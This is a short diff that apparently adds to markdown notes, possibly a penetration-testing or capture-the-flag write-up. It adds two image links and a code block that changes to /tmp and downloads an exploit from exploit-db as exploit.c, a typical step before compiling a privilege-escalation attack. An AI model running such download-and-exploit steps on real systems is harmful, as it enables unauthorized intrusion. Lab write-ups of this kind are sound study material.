@@ -381,6 +381,15 @@ id
 ---
 ---
 
+![image](https://github.com/user-attachments/assets/390d0b3e-a279-4b22-bfd2-df265e05b60e)
+
+![image](https://github.com/user-attachments/assets/3945f3af-cdf2-4342-9412-7dc108059dd7)
+
+```
+cd /tmp
+wget https://www.exploit-db.com/raw/37292 -O exploit.c
+```
+
 
 
   
